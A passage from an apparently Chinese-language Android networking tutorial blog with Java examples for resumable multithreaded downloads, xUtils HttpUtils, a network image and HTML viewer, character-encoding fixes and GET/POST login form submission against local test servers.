<pre><code>//用来记录当前线程总的下载长度
int total = 0;
while((len = is.read(b)) != -1){
    raf.write(b, 0, len);
    total += len;
    //每次下载都把新的下载位置写入缓存文本文件
    RandomAccessFile raf2 = new RandomAccessFile(threadId + &quot;.txt&quot;, &quot;rwd&quot;);
    raf2.write((startIndex + total + &quot;&quot;).getBytes());
    raf2.close();
}
</code></pre></li>
<li><p>下次下载开始时，先读取缓存文件中的值，得到的值就是该线程新的开始位置</p>
<pre><code>FileInputStream fis = new FileInputStream(file);
BufferedReader br = new BufferedReader(new InputStreamReader(fis));
String text = br.readLine();
int newStartIndex = Integer.parseInt(text);
//把读到的值作为新的开始位置
startIndex = newStartIndex;
fis.close();
</code></pre></li>
<li><p>三条线程都下载完毕之后，删除缓存文件</p>
<pre><code>RUNNING_THREAD--;
if(RUNNING_THREAD == 0){
    for(int i = 0; i &lt;= 3; i++){
        File f = new File(i + &quot;.txt&quot;);
        f.delete();
    }
}
</code></pre></li>
</ul>
<hr>
<p>#手机版的断点续传多线程下载器</p>
<ul>
<li>把刚才的代码直接粘贴过来就能用，记得在访问文件时的路径要改成Android的目录，添加访问网络和外部存储的路径</li>
</ul>
<p>###手机版的断点续传多线程下载器示例</p>
<p> public class MainActivity extends Activity {<br>        //定义要下载资源的网址<br>        String address = “<a href="http://192.168.1.105:8080/feiqiu.exe" target="_blank" rel="external">http://192.168.1.105:8080/feiqiu.exe</a>“;<br>        //定义开启的线程的个数<br>        int threadCount = 3;<br>        //定义已完成下载的子线程个数<br>        int finishedThreadCount = 0;<br>        //定义下载文件的总进度<br>        int currentPbProgress;</p>
<pre><code>    //查找控件
    private ProgressBar pb;
    private TextView tv;
    Handler handler = new Handler(){
        public void handleMessage(android.os.Message msg) {
            //更新文字显示下载进度
            tv.setText((long)pb.getProgress()*100/pb.getMax()+&quot;%&quot;);
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //初始化控件
        pb = (ProgressBar) findViewById(R.id.pb);
        tv = (TextView) findViewById(R.id.tv);
    }

    public void click(View v){

        //开启多线程，下载软件
        Thread t = new Thread(){
            @Override
            public void run() {
                try {
                    //get发送请求
                    //1 封装URL
                    URL url = new URL(address);
                    //2 获取连接对象
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    //3 设置参数
                    conn.setRequestMethod(&quot;GET&quot;);
                    conn.setConnectTimeout(8000);
                    conn.setReadTimeout(8000);
                    //4 发送请求(可不写)

                    //5 获取响应码，进行判断
                    if (conn.getResponseCode()==200) {

                        //拿到要下载的文件的总长度
                        int length = conn.getContentLength();
                        //(封装临时文件)在本地自动生成一个临时文件(若存在，则不用生成)(另外封装RandomAccessFile文件对象相当于自动获取此文件的输出流)（文件1）
                        //第二个参数de作用是:可以立即将读取的数据写入临时文件
                        //路径是：sd卡
                        File file = new File(Environment.getExternalStorageDirectory(),_getFileName(address));
                        RandomAccessFile raf = new RandomAccessFile(file, &quot;rwd&quot;); 

                        //设置临时文件与下载文件大小一致
                        raf.setLength(length);
                        //关闭临时文件(就相当于关闭临时文件的输出流)
                        raf.close();

                        //设置进度条的总进度为目标文件总长
                        pb.setMax(length);

                        //计算每条线程要下载的长度
                        int size = length/threadCount;
                        //计算每条线程的开始位置与结束位置
                        for (int i = 0; i &lt; threadCount; i++) {
                            int startIndex = i * size;//开始位置
                            int endIndex = (i+1)*size-1;//结束位置
                            if (i==threadCount-1) {
                                endIndex=length-1;
                            }
                            //开启每一条线程
                            new DownloadThread(startIndex,endIndex,i).start();
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };t.start();

    }

    //通过网址，获取文件名
    String _getFileName(String path){
        int index = path.lastIndexOf(&quot;/&quot;);
        return path.substring(index + 1);
    }

    //自定义线程:用于下载数据
    class DownloadThread extends Thread{
        //定义成员变量，某线程开始下载处的角标，结束下载处的角标，线程的id
        int startIndex;
        int endIndex;
        int threadId;
        //构造函数
        public DownloadThread(int startIndex, int endIndex, int threadId) {
            super();
            this.startIndex = startIndex;
            this.endIndex = endIndex;
            this.threadId = threadId;
        }

        @Override
        public void run() {
            //开启子线程下载目标文件
            try {
                //将每个线程记录下载进度的临时文件进行封装（文件2）
                File fileProgess = new File(Environment.getExternalStorageDirectory(),threadId+&quot;.txt&quot;);
                //定义每个线程下载的进度lastTotal(初始化为0)
                int lastTotal=0;
                //判断每个线程记录下载进度的临时文件是否存在
                if (fileProgess.exists()) {
                    //获取输入流
                    InputStream is = new FileInputStream(fileProgess);
                    BufferedReader br = new BufferedReader(new InputStreamReader(is));
                    //读取流数据，获取每个线程上一次的下载进度
                    lastTotal = Integer.parseInt(br.readLine());
                    //改变下载的开始位置，已经下载过的数据，就不要再去请求了
                    startIndex += lastTotal;
                    //关闭流
                    is.close();

                    //把上一次下载的总进度写入进度条
                    currentPbProgress += lastTotal;
                    pb.setProgress(currentPbProgress);
                    handler.sendEmptyMessage(0);
                }

                System.out.println(&quot;线程&quot; + threadId + &quot;的最终下载区间为：&quot; + startIndex + &quot;~&quot; + endIndex);

                //GET请求下载数据 封装URl 获取连接对象 设置参数
                URL url = new URL(address);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod(&quot;GET&quot;);
                conn.setConnectTimeout(8000);
                conn.setReadTimeout(8000);
                //定义请求下载的数据的范围
                conn.setRequestProperty(&quot;Range&quot;,&quot;bytes=&quot;+startIndex+&quot;-&quot;+endIndex);

                //获取响应状态码，进行判断
                if (conn.getResponseCode()==206) {

                    //获取服务器返回的流，流里的数据只有startIndex到endIndex区间的数据，并不会包含目标文件所有数据
                    InputStream is = conn.getInputStream();
                    //定义一个字节数组，用来存储每次从流里读取的数据
                    byte[] b = new byte[1024];
                    //定义一个int变量，用来接收每次从流里读取数据的长度
                    int len;
                    //定义每个线程各自的总下载进度（初始化为lastTotal）
                    int total = lastTotal;
                    //(封装临时文件)每个子线程都有自己要下载的数据，在本地自动生成一个临时文件(若存在，则不用生成)(另外封装RandomAccessFile文件对象相当于自动获取此文件的输出流)（文件3）

                    File file = new File(Environment.getExternalStorageDirectory(),_getFileName(address));
                    RandomAccessFile raf = new RandomAccessFile(file, &quot;rwd&quot;); 
                    //改变往raf中写入数据的开始位置
                    raf.seek(startIndex);

                    //开始往临时文件写数据
                    //while循环写入
                    while ((len=is.read(b))!=-1) {

                        //记录每条线程各自写入的总进度
                        total+=len;

                        System.out.println(&quot;线程&quot; + threadId + &quot;已下载的字节数为:&quot; + total);

                        //写入
                        raf.write(b,0,len);

                        //为了完成断点续传，while每次循环,都要将下载的进度，写入一个文本临时文件中
                        //(封装此记录每条线程总进度的临时文件，)(另外封装RandomAccessFile文件对象相当于自动获取此文件的输出流)（文件4）
                        RandomAccessFile rafProgress = new RandomAccessFile(fileProgess, &quot;rwd&quot;);
                        //写入线程进度
                        rafProgress.write((total+&quot;&quot;).getBytes());
                        //关闭临时文件(相当于关闭流)
                        rafProgress.close();

                        currentPbProgress += len;
                        //所有线程每次下载len个长度的字节，都会写到进度条的总进度中
                        pb.setProgress(currentPbProgress);
                        handler.sendEmptyMessage(0);
                    }
                    System.out.println(&quot;线程&quot; + threadId + &quot;下载完毕---------------------&quot;);

                    //此子线程的下载数据完成了，关闭此子线程临时文件(相当于关闭流)
                    raf.close();
                    //已完成下载的子线程个数+1
                    finishedThreadCount++;
                    //三个线程全部下载完毕，才去删除文本临时文件
                    synchronized (address) {
                        if (finishedThreadCount==3) {
                            for (int i = 0; i &lt; threadCount; i++) {
                                //（文件5）
                                File f = new File(Environment.getExternalStorageDirectory(), i+&quot;.txt&quot;);
                                if (f.exists()) {
                                    f.delete();
                                }
                            }
                            finishedThreadCount=0;
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
</code></pre><p>###用进度条显示下载进度</p>
<ul>
<li><p>拿到下载文件总长度时，设置进度条的最大值</p>
<pre><code>//设置进度条的最大值
pb.setMax(length);
</code></pre></li>
<li><p>进度条需要显示三条线程的整体下载进度，所以三条线程每下载一次，就要把新下载的长度加入进度条</p>
<ul>
<li><p>定义一个int全局变量，记录三条线程的总下载长度</p>
<pre><code>int progress;
</code></pre></li>
<li><p>刷新进度条</p>
<pre><code>while((len = is.read(b)) != -1){
    raf.write(b, 0, len);
</code></pre></li>
</ul>
</li>
</ul>
<pre><code>//把当前线程本次下载的长度加到进度条里
progress += len;
pb.setProgress(progress);
</code></pre><ul>
<li><p>每次断点下载时，从新的开始位置开始下载，进度条也要从新的位置开始显示，在读取缓存文件获取新的下载开始位置时，也要处理进度条进度</p>
<pre><code>FileInputStream fis = new FileInputStream(file);
BufferedReader br = new BufferedReader(new InputStreamReader(fis));
String text = br.readLine();
int newStartIndex = Integer.parseInt(text);

//新开始位置减去原本的开始位置，得到已经下载的数据长度
int alreadyDownload = newStartIndex - startIndex;
//把已经下载的长度设置入进度条
progress += alreadyDownload;
</code></pre><p>###添加文本框显示百分比进度</p>
<pre><code>tv.setText(progress * 100 / pb.getMax() + &quot;%&quot;);
</code></pre></li>
</ul>
<hr>
<p>#HttpUtils框架的使用</p>
<blockquote>
<p>HttpUtils本身就支持多线程断点续传，使用起来非常的方便</p>
</blockquote>
<ul>
<li><p>创建HttpUtils对象</p>
<pre><code>HttpUtils http = new HttpUtils();
</code></pre></li>
<li><p>下载文件</p>
<pre><code>http.download(url, //下载请求的网址
        target, //下载的数据保存路径和文件名
        true, //是否开启断点续传
        true, //如果服务器响应头中包含了文件名，那么下载完毕后自动重命名
        new RequestCallBack&lt;File&gt;() {//侦听下载状态

    //下载成功此方法调用
    @Override
    public void onSuccess(ResponseInfo&lt;File&gt; arg0) {
        tv.setText(&quot;下载成功&quot; + arg0.result.getPath());
    }

    //下载失败此方法调用，比如文件已经下载、没有网络权限、文件访问不到，方法传入一个字符串参数告知失败原因
    @Override
    public void onFailure(HttpException arg0, String arg1) {
        tv.setText(&quot;下载失败&quot; + arg1);
    }

    //在下载过程中不断的调用，用于刷新进度条
    @Override
    public void onLoading(long total, long current, boolean isUploading) {
        super.onLoading(total, current, isUploading);
        //设置进度条总长度
        pb.setMax((int) total);
        //设置进度条当前进度
        pb.setProgress((int) current);
        tv_progress.setText(current * 100 / total + &quot;%&quot;);
    }
});
</code></pre></li>
</ul>
<p>###关联源码 在Android private libraries下的jar，不能通过点击按钮直接关联</p>
<ul>
<li>1.在libs下创建一个FIle，名字为jar包名.jar.propertise(如：xUtils-2.6.14.jar.properties)</li>
<li>2.在.properties中写入 src=源码路径(如 src=D:\android\android58\02Android\\Androidsrc\xUtils-master\xUtils-master\library\src)不允许中文</li>
<li>3.重启eclipse</li>
</ul>
<p>###HttpUtils框架的使用示例</p>
<pre><code>public class MainActivity extends Activity {

    //定义要下载资源的网址
    String address = &quot;http://192.168.1.105:8080/feiqiu.exe&quot;;

    //查找控件
    private ProgressBar pb;
    private TextView tv_progress;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        //初始化控件
                pb = (ProgressBar) findViewById(R.id.pb);
                tv_progress = (TextView) findViewById(R.id.tv_progress);
    }

    //点击事件 使用xUtils框架完成下载
    public void click(View v){
        //创建xUtils框架对象
        HttpUtils utils = new HttpUtils();
        //调用方法实现下载 参数1-4： 1网址  2指定路径和文件名 开启断点续传 3如果响应头中有文件名，就使用响应头的文件名 4响应回调对象
        utils.download(address, &quot;/sdcard/feiqiu.exe&quot;, true, true, new RequestCallBack&lt;File&gt;() {

            //下载完成后调用
            @Override
            public void onSuccess(ResponseInfo&lt;File&gt; responseInfo) {
                //吐司 /sdcard/feiqiu.exe
                Toast.makeText(MainActivity.this, responseInfo.result.getPath(), 0).show();
            }

            //下载失败时调用
            @Override
            public void onFailure(HttpException error, String msg) {
                TextView tv_error = (TextView) findViewById(R.id.tv_error);
                tv_error.setText(msg);
            }

            //下载过程中不断调用
            @Override
            public void onLoading(long total, long current, boolean isUploading) {
                super.onLoading(total, current, isUploading);

                pb.setMax((int) total);
                pb.setProgress((int) current);
                tv_progress.setText(current*100/total+&quot;%&quot;);
            }
        });
    }
}
</code></pre>
          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/13/04-网络编程/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/02/13/04-网络编程/" itemprop="url">
                  04 网络编程
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-13T09:44:06+08:00">
                2017-02-13
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#一、网络图片查看器</p>
<p>###1.1 主线程网络图片查看器</p>
<ul>
<li><p>1 确定图片的网址</p>
<pre><code>//确定图片的网址
String address = &quot;http://192.168.1.102:8080/dd.jpg&quot;;
</code></pre></li>
<li><p>2 发送http请求</p>
<pre><code>URL url = new URL(address);
//获取连接对象，并没有建立连接
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
//设置连接和读取超时
conn.setConnectTimeout(5000);
conn.setReadTimeout(5000);
//设置请求方法，注意必须大写
conn.setRequestMethod(&quot;GET&quot;);
//建立连接，发送get请求
//conn.connect();
//建立连接，然后获取响应吗，200说明请求成功
conn.getResponseCode();
</code></pre></li>
<li><p>3 服务器的图片是以流的形式返回给浏览器的 </p>
<pre><code>//拿到服务器返回的输入流
InputStream is = conn.getInputStream();
//把流里的数据读取出来，并构造成图片
Bitmap bm = BitmapFactory.decodeStream(is);
</code></pre></li>
<li><p>4 把图片设置为ImageView的显示内容，直接在主线程刷新UI页面</p>
<pre><code>ImageView iv = (ImageView) findViewById(R.id.iv);
   iv.setImageBitmap(bm);
</code></pre></li>
<li>5 添加权限</li>
</ul>
<p>###1.2 主线程不能被阻塞</p>
<ul>
<li>在Android中，主线程被阻塞会导致应用不能刷新ui界面，不能响应用户操作，用户体验将非常差</li>
<li>主线程阻塞时间过长，系统会抛出ANR异常</li>
<li>ANR：Application Not Response；应用无响应</li>
<li>任何耗时操作都不可以写在主线程</li>
<li>因为网络交互属于耗时操作，如果网速很慢，代码会阻塞，所以网络交互的代码不能运行在主线程<br>###1.3只有主线程能刷新ui</li>
<li>刷新ui的代码只能运行在主线程，运行在子线程是没有任何效果的</li>
<li>如果需要在子线程中刷新ui，使用消息队列机制</li>
<li>主线程也叫ui线程<br>#####1.3.1消息队列</li>
<li>主线程创建时，系统会同时创建消息队列对象（MessageQueue）和消息轮询器对象（Looper）</li>
<li>轮询器的作用，就是不停的检测消息队列中是否有消息（Message）</li>
<li>Looper一旦发现Message Queue中有消息，就会把消息取出，然后把消息扔给Handler对象，Handler会调用自己的handleMessage方法来处理这条消息</li>
<li>handleMessage方法运行在主线程</li>
<li><p>主线程创建时，消息队列和轮询器对象就会被创建，但是消息处理器对象，需要使用时，自行创建</p>
<pre><code>//消息队列
Handler handler = new Handler(){
    //主线程中有一个消息轮询器looper，不断检测消息队列中是否有新消息，如果发现有新消息，自动调用此方法，注意此方法是在主线程中运行的
    public void handleMessage(android.os.Message msg) {

    }
};
</code></pre></li>
<li><p>在子线程中使用Handler对象往消息队列里发消息</p>
<pre><code>//创建消息对象
Message msg = new Message();
//消息的obj属性可以赋值任何对象，通过这个属性可以携带数据
msg.obj = bm;
//what属性相当于一个标签，用于区分出不同的消息，从而运行不能的代码
msg.what = 0;
//发送消息
handler.sendMessage(msg);
</code></pre></li>
<li><p>通过switch语句区分不同的消息</p>
<pre><code>public void handleMessage(android.os.Message msg) {
    switch (msg.what) {
    //如果是1，说明属于请求成功的消息
    case 0:
        ImageView iv = (ImageView) findViewById(R.id.iv);
        Bitmap bm = (Bitmap) msg.obj;
        iv.setImageBitmap(bm);
        break;
    case 1:
        Toast.makeText(MainActivity.this, &quot;请求失败&quot;, 0).show();
        break;
    }        
}
</code></pre><p>###1.4 加入缓存图片的功能</p>
</li>
<li><p>把服务器返回的流里的数据读取出来，然后通过文件输入流写至本地文件</p>
<pre><code>//1.拿到服务器返回的输入流
InputStream is = conn.getInputStream();
//2.把流里的数据读取出来，并构造成图片

FileOutputStream fos = new FileOutputStream(file);
byte[] b = new byte[1024];
int len = 0;
while((len = is.read(b)) != -1){
    fos.write(b, 0, len);
}
</code></pre></li>
<li><p>创建bitmap对象的代码改成</p>
<pre><code>Bitmap bm = BitmapFactory.decodeFile(file.getAbsolutePath());
</code></pre></li>
<li><p>每次发送请求前检测一下在缓存中是否存在同名图片，如果存在，则读取缓存</p>
<pre><code>// 点击事件
public void click(View v) {
    // 图片的地址
    final String address = &quot;http://192.168.1.102:8080/dd.jpg&quot;;
    // 封装图片的缓存文件
    final File file = new File(getCacheDir(), _getFileName(address));
    // 判断图片缓存文件是否存在
    if (file.exists()) {
        // 图片缓存文件存在
        Bitmap bm = BitmapFactory.decodeFile(file.getAbsolutePath());
        ImageView iv = (ImageView) findViewById(R.id.iv);
        iv.setImageBitmap(bm);
    } else {
        // 图片缓存文件不存在
        Thread t = new Thread() {
            public void run() {

            }
        }；
        t.start();
    }
}
</code></pre></li>
</ul>
<p>###1.5 网络图片查看器示例</p>
<pre><code>public class MainActivity extends Activity {
    // 主线程定义Handler
    Handler handler = new Handler() {
        public void handleMessage(android.os.Message msg) {
            switch (msg.what) {
            case 0:
                ImageView iv = (ImageView) findViewById(R.id.iv);
                iv.setImageBitmap((Bitmap) msg.obj);
                break;
            case 1:
                Toast.makeText(MainActivity.this, &quot;请求失败&quot;, 0).show();
                break;
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    // 点击事件
    public void click(View v) {
        // 图片的地址
        final String address = &quot;http://192.168.1.102:8080/dd.jpg&quot;;
        // 封装图片的缓存文件
        final File file = new File(getCacheDir(), _getFileName(address));
        // 判断图片缓存文件是否存在
        if (file.exists()) {
            // 图片缓存文件存在
            Bitmap bm = BitmapFactory.decodeFile(file.getAbsolutePath());
            ImageView iv = (ImageView) findViewById(R.id.iv);
            iv.setImageBitmap(bm);
        } else {
            // 图片缓存文件不存在
            Thread t = new Thread() {
                public void run() {
                    try {
                        // 1，2 将图片网址字符串地址封装成URL
                        URL url = new URL(address);
                        // 3 获取连接对象，此方法只是获取连接对象，方便操作参数，并不会发送请求
                        HttpURLConnection conn = (HttpURLConnection) url
                                .openConnection();
                        // 4 设置请求参数，注意大写
                        conn.setRequestMethod(&quot;GET&quot;);
                        // 连接超时
                        conn.setConnectTimeout(8000);
                        // 读取超时
                        conn.setReadTimeout(8000);
                        // 5 发送请求，建立连接（此步可不写，自动发送）
                        conn.connect();
                        // 6.获取响应码，进行判断
                        if (conn.getResponseCode() == 200) {
                            // 服务器响应正常
                            // 7.拿到服务器返回的流，流里的数据，就是客户端请求的内容
                            InputStream is = conn.getInputStream();

                            // 将流里的数据(一张图片)缓存到本地
                            FileOutputStream os = new FileOutputStream(file);
                            byte[] bt = new byte[1024];
                            int len;
                            while ((len = is.read(bt)) != -1) {
                                os.write(bt, 0, len);
                            }
                            os.close();

                            // 将本地的缓存文件数据读取出来，并构成图片
                            Bitmap bm = BitmapFactory.decodeFile(file
                                    .getAbsolutePath());

                            // 由于子线程不能刷新UI界面，将数据发送到主线程消息队列，让主线程刷新UI页面
                            // 发送消息到消息队列
                            // 获取消息对象，//如果消息池有空消息，使用消息池的消息，如果没有，此方法会自动创建一个消息对象
                            Message msg = handler.obtainMessage();
                            // 利用消息对象携带数据
                            msg.obj = bm;
                            msg.what = 0;
                            // 将消息发送到消息队列
                            handler.sendMessage(msg);
                        } else {
                            // 各种情况使得客户端请求失败，或服务器端响应失败
                            // 将失败消息发送到消息队列
                            handler.sendEmptyMessage(1);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                }
            };
            t.start();
        }
    }

    // 获取缓存文件夹下的文件名
    public String _getFileName(String address) {
        int index = address.lastIndexOf(&quot;/&quot;);
        return address.substring(index + 1);

    }
}
</code></pre><hr>
<p>#1.6 获取开源代码的网站</p>
<ul>
<li>code.google.com</li>
<li>github.com</li>
<li>在github搜索smart-image-view</li>
<li>下载开源项目smart-image-view</li>
<li><p>使用自定义组件时，标签名字要写包名</p>
<pre><code>&lt;com.loopj.android.image.SmartImageView/&gt;
</code></pre></li>
<li><p>SmartImageView的使用</p>
<pre><code>SmartImageView siv = (SmartImageView) findViewById(R.id.siv);
siv.setImageUrl(&quot;http://192.168.1.102:8080/dd.jpg&quot;);
</code></pre></li>
</ul>
<hr>
<p>#1.7 Html源文件查看器</p>
<ul>
<li><p>1 发送GET请求</p>
<pre><code>URL url = new URL(path);
//获取连接对象
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
//设置连接属性
conn.setRequestMethod(&quot;GET&quot;);
conn.setConnectTimeout(5000);
conn.setReadTimeout(5000);
//建立连接，获取响应吗
if(conn.getResponseCode() == 200){
    //拿到服务器返回的流，流里的数据，就是客户端请求的内容
    InputStream is = conn.getInputStream();
}
</code></pre></li>
<li><p>2 获取服务器返回的流，从流中把html源码读取出来</p>
<pre><code>byte[] b = new byte[1024];
int len = 0;
ByteArrayOutputStream bos = new ByteArrayOutputStream();
while((len = is.read(b)) != -1){
    //把读到的字节先写入字节数组输出流中存起来
    bos.write(b, 0, len);
}
//把字节数组输出流中的内容转换成字符串
//默认使用utf-8
text = new String(bos.toByteArray());
</code></pre></li>
</ul>
<p>-Html源文件查看器示例————————-</p>
<pre><code>public class MainActivity extends Activity {
//主线程定义消息处理器
Handler handler = new Handler(){
    public void handleMessage(android.os.Message msg) {
        switch (msg.what) {
        case 0:
            TextView tv = (TextView) findViewById(R.id.tv);
            tv.setText((String)msg.obj);
            break;

        case 1:
            Toast.makeText(MainActivity.this, &quot;请求失败啦啦啦么么哒&quot;, 0).show();
            break;
        }
    }
};
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
}

//点击事件:查看html文件源码
public void click(View v){
    Thread t = new Thread(){
        @Override
        public void run() {
            String path = &quot;http://192.168.15.27:8080/baidu.html&quot;;
            try {
                URL url = new URL(path);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod(&quot;GET&quot;);
                conn.setConnectTimeout(8000);
                conn.setReadTimeout(8000);

                //先发送请求，然后获取相应码
                if(conn.getResponseCode() == 200){
                    //拿到服务器返回的流，流里的数据，就是客户端请求的内容
                    InputStream is = conn.getInputStream();
                    //将输入流数据，转换为字符串
                    String text = Tools.getTextFromStream(is);

                    //发送消息到消息队列，触发主界面刷新页面
                    Message msg = handler.obtainMessage();
                    msg.obj = text;
                    msg.what = 0;
                    handler.sendMessage(msg);


                }
                else{
                    handler.sendEmptyMessage(1);
                }
            } catch (Exception e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    };
    t.start();


}
</code></pre><p>}</p>
<p>###1.8 乱码的处理</p>
<ul>
<li><p>乱码的出现是因为服务器和客户端码表不一致导致</p>
<pre><code>//手动指定码表
text = new String(bos.toByteArray(), &quot;gb2312&quot;);
</code></pre></li>
<li><p>在定义工具类时，将输入流数据转换为字符串，此时手动指定码表</p>
<p>  public class Tools {</p>
<pre><code>public static String getTextFromStream(InputStream is){

    byte[] b = new byte[1024];
    int len;
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    try {
        while((len = is.read(b)) != -1){
            bos.write(b, 0, len);
        }

        String text = new String(bos.toByteArray());
        return text;
    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
        return null;
    }
}
</code></pre><p>  }</p>
</li>
</ul>
<hr>
<p>#二、提交数据</p>
<p>###2.1 GET方式提交数据</p>
<ul>
<li><p>get方式提交的数据是直接拼接在url的末尾</p>
<pre><code>final String path = &quot;http://192.168.1.104/Web/servlet/CheckLogin?name=&quot; + name + &quot;&amp;pass=&quot; + pass;
</code></pre></li>
<li><p>发送get请求，代码和之前一样</p>
<pre><code>URL url = new URL(path);
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setRequestMethod(&quot;GET&quot;);
conn.setReadTimeout(5000);
conn.setConnectTimeout(5000);
if(conn.getResponseCode() == 200){

}
</code></pre></li>
<li><p>浏览器在发送请求携带数据时会对数据进行URL编码，我们写代码时也需要为中文进行URL编码</p>
<pre><code>String path = &quot;http://192.168.1.104/Web/servlet/CheckLogin?name=&quot; + URLEncoder.encode(name) + &quot;&amp;pass=&quot; + pass;
</code></pre></li>
</ul>
<p>-GET方式提交数据示例———————————————</p>
<pre><code>public class MainActivity extends Activity {

//主线程定义消息处理器Handler
Handler handler = new Handler(){
    public void handleMessage(android.os.Message msg) {
        Toast.makeText(MainActivity.this, (String)msg.obj, 0).show();
    }
};
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
}

//点击事件，get提交用户名，密码
public void click(View v){
    EditText et_name = (EditText) findViewById(R.id.et_name);
    EditText et_pass = (EditText) findViewById(R.id.et_pass);

    String name = et_name.getText().toString();
    String pass = et_pass.getText().toString();

    @SuppressWarnings(&quot;deprecation&quot;)
        //客户端提交的表单数据都会被url编码
    final String path = &quot;http://192.168.15.27/Web2/servlet/LoginServlet?name=&quot; + URLEncoder.encode(name) + &quot;&amp;pass=&quot; + pass;

    Thread t = new Thread(){
        @Override
        public void run() {
            try {
                URL url = new URL(path);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod(&quot;GET&quot;);
                conn.setConnectTimeout(8000);
                conn.setReadTimeout(8000);

                if(conn.getResponseCode() == 200){
                    //服务器成功响应，拿到服务器返回的流
                    InputStream is = conn.getInputStream();
                    //将流中的数据转成字符串
                    String text = Tools.getTextFromStream(is);

                    // 发送消息到消息队列，在主线程刷新页面
                    Message msg = handler.obtainMessage();
                    msg.obj = text;
                    handler.sendMessage(msg);
                }
            } catch (Exception e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    };
    t.start();
}
}

//工具类
public class Tools {
    //读取输入流的数据，返回字符串
    public static String getTextFromStream(InputStream is){
        byte[] b = new byte[1024];
        int len;
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            while((len = is.read(b)) != -1){
                bos.write(b, 0, len);
            }
            String text = new String(bos.toByteArray());
            return text;
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
            return null;
        }
    }
}
</code></pre><p>###2.2 POST方式提交数据</p>
<ul>
<li>post提交数据是用流写给服务器的</li>
<li><p>协议头中多了两个属性</p>
<ul>
<li>Content-Type: application/x-www-form-urlencoded，描述提交的数据的mimetype</li>
<li><p>Content-Length: 32，描述提交的数据的长度</p>
<pre><code>//给请求头添加post多出来的两个属性
String data = &quot;name=&quot; + URLEncoder.encode(name) + &quot;&amp;pass=&quot; + pass;
conn.setRequestProperty(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
conn.setRequestProperty(&quot;Content-Length&quot;, data.length() + &quot;&quot;);
</code></pre></li>
</ul>
</li>
<li><p>设置允许打开post请求的流</p>
<pre><code>conn.setDoOutput(true);
</code></pre></li>
<li><p>获取连接对象的输出流，往流里写要提交给服务器的数据</p>
<pre><code>OutputStream os = conn.getOutputStream();
os.write(data.getBytes());
</code></pre></li>
</ul>
<p>-POST方式提交数据—————————-</p>
<pre><code>public class MainActivity extends Activity {
    //主线程定义消息处理器Handler
    Handler handler = new Handler(){
        public void handleMessage(android.os.Message msg) {
            Toast.makeText(MainActivity.this, (String)msg.obj, 0).show();
        }
    };
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    //点击事件，post提交用户名，密码
    public void click(View v){
        EditText et_name = (EditText) findViewById(R.id.et_name);
        EditText et_pass = (EditText) findViewById(R.id.et_pass);

        final String name = et_name.getText().toString();
        final String pass = et_pass.getText().toString();

        @SuppressWarnings(&quot;deprecation&quot;)
        final String path = &quot;http://192.168.15.27/Web2/servlet/LoginServlet&quot;;

        Thread t = new Thread(){
            @Override
            public void run() {
                try {
                    URL url = new URL(path);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod(&quot;POST&quot;);
                    conn.setConnectTimeout(8000);
                    conn.setReadTimeout(8000);

                    //拼接去要提交的数据
                    String content = &quot;name=&quot; + URLEncoder.encode(name) + &quot;&amp;pass=&quot; + pass;

                    //添加post请求头中的属性
                    conn.setRequestProperty(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
